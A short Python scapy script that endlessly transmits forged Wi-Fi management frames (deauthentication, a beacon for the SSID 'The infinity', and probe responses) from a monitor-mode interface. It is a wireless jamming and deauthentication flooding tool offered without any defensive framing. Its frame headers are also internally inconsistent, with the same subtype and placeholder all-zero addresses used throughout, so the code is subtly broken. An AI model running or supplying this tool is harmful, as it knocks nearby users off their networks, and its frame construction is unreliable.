from scapy.all import *

def the_infinity():
    packet = RadioTap() / Dot11(type=0, subtype=4, addr1="00:00:00:00:00:00", addr2="00:00:00:00:00:00", addr3="00:00:00:00:00:00") / Dot11Deauth()

    while True:
        sendp(packet, iface="wlan0mon", verbose=0)
        packet = RadioTap() / Dot11(type=0, subtype=4, addr1="00:00:00:00:00:00", addr2="00:00:00:00:00:00", addr3="00:00:00:00:00:01") / Dot11Beacon(cap="ESS", SSID="The infinity")
        sendp(packet, iface="wlan0mon", verbose=0)
        packet = RadioTap() / Dot11(type=0, subtype=4, addr1="00:00:00:00:00:00", addr2="00:00:00:00:00:01", addr3="00:00:00:00:00:00") / Dot11ProbeResp()
        sendp(packet, iface="wlan0mon", verbose=0)

if __name__ == "__main__":
    the_infinity()